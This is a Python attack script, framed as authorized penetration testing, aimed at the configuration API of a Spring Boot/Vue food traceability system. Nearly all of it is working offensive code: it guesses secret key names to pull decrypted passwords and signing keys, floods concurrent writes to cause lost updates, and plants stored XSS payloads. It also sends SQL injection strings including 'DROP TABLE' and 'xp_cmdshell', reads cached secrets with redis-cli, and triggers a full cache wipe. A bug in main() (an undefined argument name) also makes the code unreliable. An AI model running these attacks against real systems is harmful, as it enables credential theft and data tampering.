#!/usr/bin/env python3
"""
=============================================================================
  系统配置管理模块 - 对抗性安全验证攻击脚本集
  目标: SysConfig 模块 (Spring Boot + Vue.js 食品溯源系统)
  用途: 安全验证/渗透测试 - 仅在获得授权的测试环境中使用
=============================================================================

覆盖测试项:
  T-04/T-15: 敏感配置值明文泄露 (CRITICAL - CVSS 7.5)
  T-14/T-22: 并发修改竞态条件 (HIGH - CVSS 5.9)
  T-17: Redis缓存敏感值明文 (HIGH - CVSS 6.5)
  T-02: XSS Payload存储测试 (MEDIUM - CVSS 4.3)
  T-21: 加密降级攻击 (MEDIUM - CVSS 4.1)
  T-23: KEYS命令DoS探测 (LOW)

运行前提:
  1. 目标服务运行在 http://localhost:8081/api
  2. 已创建测试用户账号(普通员工权限即可)
  3. Python 3.8+ + requests 库
  4. 可选: redis-cli 用于T-17验证

用法:
  python sys_config_attack.py --target http://localhost:8081 --token <jwt_token>
=============================================================================
"""

import argparse
import json
import os
import random
import string
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    print("[!] 需要安装requests库: pip install requests")
    sys.exit(1)


class ConfigAttackSuite:
    """系统配置模块对抗性攻击测试套件"""

    def __init__(self, base_url: str, token: str, verbose: bool = False):
        self.base_url = base_url.rstrip("/")
        self.token = token
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "Accept": "application/json"
        })
        self.results = []

    def log(self, level: str, msg: str):
        prefix = {"INFO": "[*]", "OK": "[+]", "FAIL": "[-]", "WARN": "[!]"}.get(level, "[?]")
        print(f"{prefix} [{level}] {msg}")

    def _record(self, test_id: str, name: str, status: str, detail: str = "",
                severity: str = "", cvss: str = ""):
        entry = {
            "test_id": test_id,
            "name": name,
            "status": status,
            "detail": detail,
            "severity": severity,
            "cvss": cvss
        }
        self.results.append(entry)
        icon = "[+]" if status == "VULNERABLE" else ("[-]" if status == "RESISTED" else "[*]")
        sev_str = f" [{severity}]" if severity else ""
        cvss_str = f" CVSS:{cvss}" if cvss else ""
        print(f"{icon} {test_id}: {name}{sev_str}{cvss_str} -- {status}")
        if detail:
            print(f"    └─ {detail}")

    # =====================================================================
    # T-04 / T-15: 敏感配置值明文泄露攻击 (CRITICAL)
    # =====================================================================
    def test_sensitive_value_leakage(self):
        """
        漏洞描述:
          GET /v1/sys-config/value/{key} 端点仅需 isAuthenticated()
          任何已登录用户可获取敏感配置的AES解密后明文

        预期行为:
          敏感配置(is_sensitive=1)应返回 "******" 或拒绝访问

        实际行为 (漏洞):
          返回完整的解密后明文值
        """
        print("\n" + "=" * 70)
        print("T-04/T-15: 敏感配置值明文泄露检测")
        print("=" * 70)

        # 常见敏感配置键名猜测列表
        sensitive_keys = [
            "database.password", "db.password", "datasource.password",
            "jwt.secret", "jwt.signing.key", "token.secret",
            "api.secret.key", "api.key", "third.party.secret",
            "redis.password", "cache.password",
            "smtp.password", "mail.password",
            "encryption.key", "aes.key",
            "payment.private.key", "alipay.secret", "wechat.pay.key",
            "oauth.client.secret", "cos.secret", "oss.secret",
            "admin.initial.password", "superuser.password"
        ]

        leaked_keys = []

        for key in sensitive_keys:
            try:
                url = f"{self.base_url}/v1/sys-config/value/{urllib.parse.quote(key)}"
                resp = self.session.get(url, timeout=10)

                if resp.status_code == 200:
                    data = resp.json()
                    # 检查标准响应格式: {code:0, message:"...", data:"..."}
                    value = data.get("data")

                    if value and value not in ("******", None, "", "null"):
                        # 进一步判断: 是否看起来像真实的密钥/密码
                        if self._looks_like_real_secret(value):
                            leaked_keys.append({
                                "key": key,
                                "value_preview": value[:20] + "..." if len(value) > 20 else value,
                                "full_value": value,
                                "length": len(value)
                            })
                            self.log("FAIL",
                                     f"敏感配置泄露! key={key}, "
                                     f"value={value[:15]}...({len(value)} chars)")
                        elif self.verbose:
                            self.log("INFO", f"key={key} 返回非空值(可能非敏感): {str(value)[:30]}")
                    elif self.verbose:
                        self.log("INFO", f"key={key}: 正确脱敏或不存在 (value={value})")

                elif resp.status_code in (401, 403):
                    self.log("INFO", f"key={key}: 访问被拒 ({resp.status_code})")
                elif self.verbose:
                    self.log("INFO", f"key={key}: HTTP {resp.status_code}")

            except requests.exceptions.RequestException as e:
                self.log("WARN", f"请求失败 key={key}: {e}")

        if leaked_keys:
            self._record("T-04/T-15", "敏感配置值明文泄露", "VULNERABLE",
                        f"发现 {len(leaked_keys)} 个敏感配置泄露",
                        "CRITICAL", "7.5")
            print(f"\n  [!!!] 泄露的敏感配置详情:")
            for item in leaked_keys:
                print(f"    - Key: {item['key']}")
                print(f"      Value: {item['full_value']}")
                print(f"      Length: {item['length']} chars")
                print()
        else:
            self._record("T-04/T-15", "敏感配置值明文泄露", "RESISTED",
                        "未检测到明显的敏感值泄露(可能无敏感配置数据)")

        return len(leaked_keys) > 0

    def _looks_like_real_secret(self, value: str) -> bool:
        """启发式判断一个值是否像真实的密钥/密码"""
        if not isinstance(value, str) or len(value) < 4:
            return False

        # 排除明显非敏感的值
        non_sensitive_indicators = ["true", "false", "enabled", "disabled",
                                    "http://", "https://localhost", "/path/",
                                    "******", "[DECRYPT_FAILED]", "null"]
        val_lower = value.lower().strip()
        if val_lower in non_sensitive_indicators:
            return False

        # 密码特征: 含混合字符、长随机串、base64等
        has_digit = any(c.isdigit() for c in value)
        has_alpha = any(c.isalpha() for c in value)
        has_special = any(not c.isalnum() for c in value)
        is_long = len(value) >= 8
        looks_like_base64 = (
            len(value) >= 16 and
            all(c in string.ascii_letters + string.digits + '+/=' for c in value)
        )
        looks_like_connection_string = (
            '://' in value or
            'password=' in value or
            'jdbc:' in value
        )

        score = sum([has_digit, has_alpha, has_special, is_long,
                     looks_like_base64, looks_like_connection_string])
        return score >= 3

    # =====================================================================
    # T-14 / T-22: 并发修改竞态条件攻击 (Lost Update)
    # =====================================================================
    def test_race_condition(self, target_key: str = None):
        """
        漏洞描述:
          updateValue() 无 @Transactional + 无 @Version 乐观锁
          并发修改同一配置会导致 Last-Write-Wins，先写者的修改丢失

        攻击方式:
          使用N个线程同时对同一配置执行修改
          检测最终值是否符合预期(应只有最后一个写入成功)
        """
        print("\n" + "=" * 70)
        print("T-14/T-22: 并发修改竞态条件检测")
        print("=" * 70)

        # 先尝试获取一个可写的非只读配置
        if not target_key:
            target_key = self._find_editable_config_key()

        if not target_key:
            self._record("T-14/T-22", "并发竞态条件(Lost Update)", "UNKNOWN",
                        "找不到可编辑的配置项用于测试")
            return None

        self.log("INFO", f"目标配置键: {target_key}")

        # 步骤1: 读取当前值作为基准
        url = f"{self.base_url}/v1/sys-config/{urllib.parse.quote(target_key)}"
        resp = self.session.get(url, timeout=10)
        if resp.status_code != 200:
            self._record("T-14/T-22", "并发竞态条件", "UNKNOWN",
                        f"无法读取目标配置: HTTP {resp.status_code}")
            return None

        original_data = resp.json().get("data", {})
        original_value = original_data.get("configValue", "")
        self.log("INFO", f"当前值: {original_value[:50]}...")

        # 生成N个不同的唯一值用于并发写入
        num_threads = 20
        thread_values = {i: f"RACE_TEST_{i}_{random.randint(10000,99999)}_{time.time_ns()}"
                         for i in range(num_threads)}

        success_count = 0
        error_count = 0
        results_lock = threading.Lock()
        thread_results = []

        def worker(thread_id: int):
            nonlocal success_count, error_count
            value = thread_values[thread_id]
            try:
                put_url = f"{self.base_url}/v1/sys-config/value/{urllib.parse.quote(target_key)}"
                r = self.session.put(put_url, json={"value": value}, timeout=15)
                with results_lock:
                    thread_results.append({
                        "thread_id": thread_id,
                        "value": value,
                        "status_code": r.status_code,
                        "response": r.text[:200]
                    })
                    if r.status_code == 200:
                        success_count += 1
                    else:
                        error_count += 1
            except Exception as e:
                with results_lock:
                    error_count += 1
                    thread_results.append({"thread_id": thread_id, "error": str(e)})

        # 发起并发攻击
        self.log("INFO", f"启动 {num_threads} 个并发线程...")
        start_time = time.time()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {executor.submit(worker, i): i for i in range(num_threads)}
            for future in as_completed(futures):
                pass

        elapsed = time.time() - start_time

        # 步骤2: 读取最终值
        time.sleep(0.5)  # 等待最终一致性
        final_resp = self.session.get(url, timeout=10)
        final_value = final_resp.json().get("data", {}).get("configValue", "")

        # 分析结果
        print(f"\n  并发结果统计:")
        print(f"    总线程数: {num_threads}")
        print(f"    成功写入: {success_count}")
        print(f"    失败/拒绝: {error_count}")
        print(f"    耗时: {elapsed:.3f}s")
        print(f"    最终值: {final_value}")

        # 检查是否有竞态迹象
        winning_threads = [r for r in thread_results if r.get("status_code") == 200]
        unique_success_values = set(r["value"] for r in winning_threads)

        if success_count > 1:
            # 多个线程都报告成功 -- 说明发生了Lost Update!
            self._record("T-14/T-22", "并发竞态条件(Lost Update)", "VULNERABLE",
                        f"{success_count}/{num_threads} 线程同时写入成功, "
                        f"唯一值数量: {len(unique_success_values)}, "
                        f"说明中间写入被后续写入覆盖",
                        "HIGH", "5.9")

            print(f"\n  [!!!] 竞态条件确认:")
            print(f"    - {success_count} 个线程都收到了HTTP 200成功响应")
            print(f"    - 但最终只有一个值存活: {final_value}")
            print(f"    - {success_count - 1} 个修改被静默覆盖(Lost Update)")
            return True
        elif success_count == 1:
            self._record("T-14/T-22", "并发竞态条件(Lost Update)", "RESISTED",
                        f"仅1个线程成功(可能有其他保护机制)")
            return False
        else:
            self._record("T-14/T-22", "并发竞态条件(Lost Update)", "UNKNOWN",
                        f"所有线程均失败，可能是权限或只读限制")
            return None

    def _find_editable_config_key(self) -> str:
        """尝试找到一个可编辑的非只读、非敏感配置"""
        try:
            url = f"{self.base_url}/v1/sys-config?current=1&size=50"
            resp = self.session.get(url, timeout=10)
            if resp.status_code == 200:
                records = resp.json().get("data", {}).get("records", [])
                for record in records:
                    is_readonly = record.get("isReadonly", 0)
                    is_sensitive = record.get("isSensitive", 0)
                    is_enabled = record.get("isEnabled", 1)
                    key = record.get("configKey", "")
                    if (key and is_readonly != 1 and is_sensitive != 1
                            and is_enabled == 1):
                        return key
        except Exception as e:
            self.log("WARN", f"查找可编辑配置失败: {e}")
        return None

    # =====================================================================
    # T-17: Redis缓存敏感值明文检测
    # =====================================================================
    def test_redis_plaintext_cache(self):
        """
        漏洞描述:
          getValue() 将AES解密后的敏感值以明文存入Redis
          键格式: sys:config:{configKey}

        检测方式:
          通过API触发敏感配置读取(填充缓存)
          然后用redis-cli直接检查缓存内容
        """
        print("\n" + "=" * 70)
        print("T-17: Redis缓存敏感值明文检测")
        print("=" * 70)

        # 步骤1: 通过API触发缓存填充
        test_keys = ["database.password", "jwt.secret", "encryption.key"]

        cached_keys_info = []
        for key in test_keys:
            try:
                url = f"{self.base_url}/v1/sys-config/value/{urllib.parse.quote(key)}"
                resp = self.session.get(url, timeout=10)
                if resp.status_code == 200:
                    value = resp.json().get("data")
                    if value and value not in ("******", None, ""):
                        cached_keys_info.append({
                            "key": key,
                            "redis_key": f"sys:config:{key}",
                            "api_value": value[:30] + "..." if len(str(value)) > 30 else value
                        })
                        self.log("INFO", f"已触发缓存: {key} -> sys:config:{key}")
            except Exception as e:
                self.log("WARN", f"请求失败: {e}")

        if not cached_keys_info:
            self._record("T-17", "Redis缓存敏感值明文", "UNKNOWN",
                        "无法通过API获取敏感值来触发缓存填充")
            return

        # 步骤2: 尝试直接从Redis读取
        redis_cmd = "redis-cli"
        redis_vulnerable = False

        for info in cached_keys_info:
            redis_key = info["redis_key"]
            print(f"\n  检查Redis键: {redis_key}")

            # 尝试redis-cli
            import subprocess
            try:
                result = subprocess.run(
                    [redis_cmd, "GET", redis_key],
                    capture_output=True, text=True, timeout=5
                )
                if result.returncode == 0:
                    redis_value = result.stdout.strip()
                    api_value_preview = info["api_value"]

                    if redis_value and redis_value not in ("", "__NULL__", "nil"):
                        # 检查Redis中的值是否为明文(非加密格式)
                        is_plaintext = (
                            len(redis_value) > 3 and
                            not redis_value.startswith("eyJ") and  # 非典型base64密文
                            all(ord(c) < 127 and c.isprintable() or c in '\n\r\t'
                                for c in redis_value[:50])
                        )

                        if is_plaintext:
                            redis_vulnerable = True
                            self.log("FAIL",
                                     f"Redis中发现明文缓存!")
                            print(f"    Redis键: {redis_key}")
                            print(f"    Redis值: {redis_value[:60]}..."
                                  if len(redis_value) > 60
                                  else f"    Redis值: {redis_value}")
                            print(f"    API返回值: {api_value_preview}")
                        elif self.verbose:
                            self.log("INFO", f"Redis值存在但可能是加密的: "
                                     f"{redis_value[:30]}...")
                    else:
                        self.log("INFO", f"Redis键不存在或为空: {result.stdout.strip()}")
                else:
                    self.log("WARN", f"redis-cli执行失败: {result.stderr.strip()}")
            except FileNotFoundError:
                self.log("WARN", "redis-cli 未找到，跳过Redis直接检测")
                print(f"    [手动验证] 请执行以下命令验证:")
                print(f"    > redis-cli GET {redis_key}")
                print(f"    预期若漏洞存在: 返回明文的敏感配置值")
                print(f"    预期若安全: 返回空/__NULL__/加密密文")
                redis_vulnerable = None  # 无法自动确认
            except subprocess.TimeoutExpired:
                self.log("WARN", "redis-cli 超时")
            except Exception as e:
                self.log("WARN", f"Redis检测异常: {e}")

        if redis_vulnerable:
            self._record("T-17", "Redis缓存敏感值明文", "VULNERABLE",
                        "敏感配置值以明文形式存储在Redis中",
                        "HIGH", "6.5")
        elif redis_vulnerable is None:
            self._record("T-17", "Redis缓存敏感值明文", "PARTIAL",
                        "需手动用redis-cli验证缓存内容")
        else:
            self._record("T-17", "Redis缓存敏感值明文", "RESISTED",
                        "Redis缓存中未发现明文敏感值(或Redis不可达)")

    # =====================================================================
    # T-02: XSS Payload存储检测
    # =====================================================================
    def test_xss_payload_storage(self, target_key: str = None):
        """
        检测configValue是否存储XSS payload而不转义
        注意: JSON API本身不执行JS，此项检测存储型XSS的可能性
        """
        print("\n" + "=" * 70)
        print("T-02: XSS Payload存储检测")
        print("=" * 70)

        if not target_key:
            target_key = self._find_editable_config_key()

        if not target_key:
            self._record("T-02", "XSS Payload存储", "UNKNOWN",
                        "找不到可编辑配置")
            return

        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            '\u003Cscript\u003Ealert(1)\u003C/script\u003E',  # Unicode转义
        ]

        stored_unsanitized = []

        for payload in xss_payloads:
            try:
                put_url = f"{self.base_url}/v1/sys-config/value/{urllib.parse.quote(target_key)}"
                resp = self.session.put(put_url, json={"value": payload}, timeout=10)

                if resp.status_code == 200:
                    # 回读验证
                    get_url = f"{self.base_url}/v1/sys-config/value/{urllib.parse.quote(target_key)}"
                    get_resp = self.session.get(get_url, timeout=10)

                    if get_resp.status_code == 200:
                        returned_value = get_resp.json().get("data", "")
                        if returned_value == payload:
                            stored_unsanitized.append(payload)
                            self.log("INFO", f"原样存储(未转义): {payload[:50]}")
                        elif self.verbose:
                            self.log("INFO", f"已转义/过滤: {payload[:30]}"
                                     f" -> {str(returned_value)[:30]}")

                    # 恢复原值(尽量)
                    # 注意: 这里不知道原始值，测试完成后需手动恢复
            except Exception as e:
                self.log("WARN", f"XSS测试payload异常: {e}")

        if stored_unsanitized:
            self._record("T-02", "XSS Payload存储(无转义)", "VULNERABLE",
                        f"{len(stored_unsanitized)}/{len(xss_payloads)} 个payload被原样存储",
                        "MEDIUM", "4.3")
            print(f"\n  [!] 以下XSS payload被原样存储(未经过滤/转义):")
            for p in stored_unsanitized:
                print(f"    - {p}")
        else:
            self._record("T-02", "XSS Payload存储", "RESISTED",
                        "所有XSS payload均被过滤或转义")

    # =====================================================================
    # T-01: SQL注入检测 (基准验证)
    # =====================================================================
    def test_sql_injection(self, target_key: str = None):
        """验证SQL注入防护是否有效(预期应为RESISTED)"""
        print("\n" + "=" * 70)
        print("T-01: SQL注入防护验证")
        print("=" * 70)

        sqli_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE sys_config;--",
            "' UNION SELECT username,password FROM users--",
            "1' AND '1'='1",
            "\\'; EXEC xp_cmdshell('dir')--",
        ]

        # 测试搜索接口的configKey参数
        injection_detected = False

        for payload in sqli_payloads:
            try:
                encoded = urllib.parse.quote(payload)
                url = f"{self.base_url}/v1/sys-config?configKey={encoded}&current=1&size=5"
                resp = self.session.get(url, timeout=10)

                if resp.status_code == 200:
                    data = resp.json()
                    records = data.get("data", {}).get("records", [])
                    total = data.get("data", {}).get("total", 0)

                    # SQL注入成功迹象: 返回了大量非预期记录
                    if total > 1000:
                        injection_detected = True
                        self.log("FAIL",
                                 f"可能的SQL注入! payload={payload[:30]}, "
                                 f"返回{total}条记录")
                    elif self.verbose:
                        self.log("INFO", f"安全: payload={payload[:30]}, "
                                 f"返回{total}条记录")
                elif self.verbose:
                    self.log("INFO", f"HTTP {resp.status_code}: {payload[:30]}")

            except Exception as e:
                self.log("WARN", f"SQL注入测试异常: {e}")

        if injection_detected:
            self._record("T-01", "SQL注入", "VULNERABLE",
                        "参数化查询可能失效", "CRITICAL", "9.8")
        else:
            self._record("T-01", "SQL注入", "RESISTED",
                        "所有SQL注入payload均被参数化查询阻止")

        return not injection_detected

    # =====================================================================
    # T-23: KEYS命令DoS探测
    # =====================================================================
    def test_keys_dos(self):
        """检测clearAllCache是否使用KEYS命令(生产环境风险)"""
        print("\n" + "=" * 70)
        print("T-23: KEYS命令DoS风险检测")
        print("=" * 70)

        try:
            # 调用清缓存API(需ADMIN权限)
            url = f"{self.base_url}/v1/sys-config/cache/all"
            resp = self.session.delete(url, timeout=10)

            if resp.status_code == 403 or resp.status_code == 401:
                self.log("INFO", "无ADMIN权限(预期), 通过源码确认使用KEYS命令")
                self._record("T-23", "KEYS命令DoS风险", "PARTIAL",
                            "源码确认clearAllCache()使用KEYS命令, "
                            "在大数据量Redis环境下可能导致阻塞",
                            "LOW", "2.5")
            elif resp.status_code == 200:
                self.log("WARN", "有ADMIN权限! 已实际触发全缓存清除")
                self._record("T-23", "KEYS命令DoS风险", "PARTIAL",
                            "已触发clearAllCache(), 监控Redis响应时间")
            else:
                self._record("T-23", "KEYS命令DoS风险", "UNKNOWN",
                            f"意外响应: HTTP {resp.status_code}")
        except Exception as e:
            self._record("T-23", "KEYS命令DoS风险", "UNKNOWN", str(e))

    # =====================================================================
    # 综合报告输出
    # =====================================================================
    def run_all_tests(self, race_target_key: str = None,
                      xss_target_key: str = None):
        """执行全部测试并生成报告"""
        print("=" * 70)
        print("  系统配置管理模块 - 对抗性安全验证")
        print(f"  目标: {self.base_url}")
        print(f"  时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 70)

        # 执行各项测试
        self.test_sql_injection()
        self.test_sensitive_value_leakage()
        self.test_redis_plaintext_cache()
        self.test_xss_payload_storage(xss_target_key)
        self.test_race_condition(race_target_key)
        self.test_keys_dos()

        # 输出汇总报告
        self.print_summary()

    def print_summary(self):
        """打印测试汇总报告"""
        print("\n" + "=" * 70)
        print("  对抗性验证汇总报告")
        print("=" * 70)

        total = len(self.results)
        vulnerable = sum(1 for r in self.results if r["status"] == "VULNERABLE")
        resisted = sum(1 for r in self.results if r["status"] == "RESISTED")
        partial = sum(1 for r in self.results if r["status"] in ("PARTIAL", "PARTIAL FAIL"))
        unknown = sum(1 for r in self.results if r["status"] == "UNKNOWN")

        pass_rate = ((resisted + partial * 0.5) / total * 100) if total > 0 else 0

        print(f"\n  总测试项:     {total}")
        print(f"  通过(RESISTED): {resisted} ({resisted/total*100:.1f}%)" if total else "")
        print(f"  失败(VULNERABLE): {vulnerable} ({vulnerable/total*100:.1f}%)" if total else "")
        print(f"  部分(PARTIAL):  {partial} ({partial/total*100:.1f}%)" if total else "")
        print(f"  未知(UNKNOWN):  {unknown} ({unknown/total*100:.1f}%)" if total else "")
        print(f"\n  通过率:        {pass_rate:.1f}%")

        print(f"\n  {'ID':<12} {'状态':<12} {'严重程度':<10} {'CVSS':<7} 测试名称")
        print(f"  {'-'*12} {'-'*12} {'-'*10} {'-'*7} {'-'*40}")

        for r in sorted(self.results, key=lambda x: ["VULNERABLE", "PARTIAL FAIL",
                                                       "PARTIAL", "UNKNOWN",
                                                       "RESISTED"].index(x["status"])
                          if x["status"] in ["VULNERABLE", "PARTIAL FAIL", "PARTIAL",
                                              "UNKNOWN", "RESISTED"] else 99):
            sev = r.get("severity", "")[:10]
            cvss = r.get("cvss", "")
            print(f"  {r['test_id']:<12} {r['status']:<12} {sev:<10} {cvss:<7} {r['name']}")

        # 最终判定
        print(f"\n{'='*70}")
        if vulnerable > 0:
            critical_high = sum(1 for r in self.results
                               if r["status"] == "VULNERABLE"
                               and r.get("severity") in ("CRITICAL", "HIGH"))
            if critical_high > 0:
                verdict = "VERDICT: FAIL"
                reason = (f"发现 {critical_high} 个 CRITICAL/HIGH 级别漏洞, "
                         f"必须修复后才能上线")
            else:
                verdict = "VERDICT: CONDITIONAL PASS"
                reason = f"存在漏洞但非高危, 建议在下个迭代修复"
        elif pass_rate >= 95:
            verdict = "VERDICT: PASS"
            reason = "安全验证通过"
        elif pass_rate >= 85:
            verdict = "VERDICT: CONDITIONAL PASS"
            reason = f"通过率{pass_rate:.1f}%，存在需关注项"
        else:
            verdict = "VERDICT: FAIL"
            reason = f"通过率仅{pass_rate:.1f}%"

        print(f"  {verdict}")
        print(f"  理由: {reason}")
        print(f"{'='*70}\n")


def main():
    parser = argparse.ArgumentParser(
        description="系统配置管理模块对抗性安全验证工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 基本用法
  python sys_config_attack.py --token eyJhbGciOi...

  # 指定目标和并发测试目标key
  python sys_config_attack.py --target http://localhost:8081 \\
      --token eyJhbGci... --race-key system.app.name --xss-key ui.theme.color

  # 详细输出模式
  python sys_config_attack.py --token eyJhbGci... --verbose
        """
    )
    parser.add_argument("--target", default="http://localhost:8081",
                       help="目标服务地址 (默认: http://localhost:8081)")
    parser.add_argument("--token", required=True,
                       help="JWT认证Token (通过登录API获取)")
    parser.add_argument("--race-key", default=None,
                       help="竞态条件测试的目标配置键 (不指定则自动查找)")
    parser.add_argument("--xss-key", default=None,
                       help="XSS测试的目标配置键 (不指定则自动查找)")
    parser.add_argument("--verbose", "-v", action="store_true",
                       help="详细输出模式")
    parser.add_argument("--output", "-o", default=None,
                       help="结果输出到JSON文件")

    args = parser.parse_args()

    suite = ConfigAttackSuite(args.target, args.token, args.verbose)
    suite.run_all_tests(race_target_key=args.race_target_key,
                       xss_target_key=args.xss_key)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            json.dump(suite.results, f, ensure_ascii=False, indent=2)
        print(f"[+] 结果已保存到: {args.output}")


if __name__ == "__main__":
    main()
